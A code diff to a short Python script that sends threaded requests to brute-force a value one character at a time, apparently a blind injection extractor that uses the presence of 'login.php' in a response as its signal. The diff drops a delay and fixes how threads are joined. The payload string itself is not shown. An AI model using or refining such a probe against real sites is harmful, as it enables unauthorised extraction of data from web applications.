@@ -14,15 +14,16 @@ def fun(url,result,result2):
         # try:
             reponse=requests.get(url+data.format(result,i),timeout=0.5)
             if 'login.php' in reponse.text:
-                time.sleep(1)
                 print(result,url+data.format(result,i),chr(i)+"\n")
                 break
         # except:
         #     print("error\n")
         #     continue
     return
+threads=[]
 for  i in range(result):
     t=threading.Thread(target=fun,args=(url,i,150))
+    threads.append(t)
     t.start()
-for i in range(result):      # 循环开始
+for i in threads:      # 循环开始
     i.join()
